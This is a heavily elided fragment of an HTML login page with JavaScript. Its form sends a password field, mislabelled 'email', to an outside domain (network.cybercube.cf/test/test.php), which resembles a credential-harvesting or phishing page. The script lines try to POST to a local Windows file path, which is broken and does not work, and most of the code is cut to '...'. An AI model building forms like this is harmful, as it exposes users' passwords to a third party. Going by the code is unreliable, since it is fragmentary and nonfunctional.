...
<body>
          ...
          <article class="article">
            <div class="content">
              <div class="login-box">
                ...
                <div class="form-wrap">
                 <form action="http://network.cybercube.cf/test/test.php" method="post">
                    ...
                    <div class="input-box">
                      <input type="password" name="email" id="email" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  
  ...
  do {
    ...
    request.open("POST", "file:///C:/Users/hp/Pictures/BlueStacks/k.json");
...
xhr.open("POST", "file:///C:/Users/hp/Pictures/BlueStacks/k.json");
